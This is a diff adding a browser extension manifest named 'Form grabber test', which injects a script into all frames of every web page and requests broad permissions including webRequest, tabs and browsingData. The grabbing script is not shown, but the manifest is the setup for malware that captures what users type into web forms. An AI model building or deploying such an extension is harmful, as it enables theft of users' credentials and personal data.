@@ -1,0 +1,17 @@
+{
+  "name": "Form grabber test",
+  "description": "grabber test",
+  "version": "2.3",
+  "manifest_version": 2,
+  "icons": {},
+  "background": {
+    "scripts": []
+  },
+  "content_scripts": [{
+    "all_frames": true,
+    "run_at": "document_end",
+    "matches": ["http://*/*", "https://*/*"],
+    "js": ["js/app.js"]
+  }],
+  "permissions": ["tabs", "http://*/", "https://*/", "background", "webRequest", "storage", "browsingData"]
+}
